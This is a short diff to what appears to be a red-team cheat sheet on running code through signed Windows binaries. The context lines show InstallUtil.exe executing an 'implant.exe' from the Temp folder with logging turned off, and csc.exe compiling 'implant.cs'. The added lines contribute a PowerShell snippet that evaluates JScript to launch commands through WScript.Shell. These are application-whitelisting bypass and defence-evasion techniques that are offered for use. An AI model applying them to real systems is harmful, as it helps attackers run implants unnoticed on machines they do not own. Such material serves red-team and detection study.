@@ -48,10 +48,18 @@ C:\> cmd.exe /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.3031
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\implant.exe
 ```
 
-### CSC
+## CSC
 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\implant.cs
+```
+
+## JScript
+
+```powershell
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');
+$js = 'var js = new ActiveXObject("WScript.Shell");js.Run("<commands>");'
+[Microsoft.JScript.Eval]::JScriptEvaluate($js,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());
 ```
 
 ---
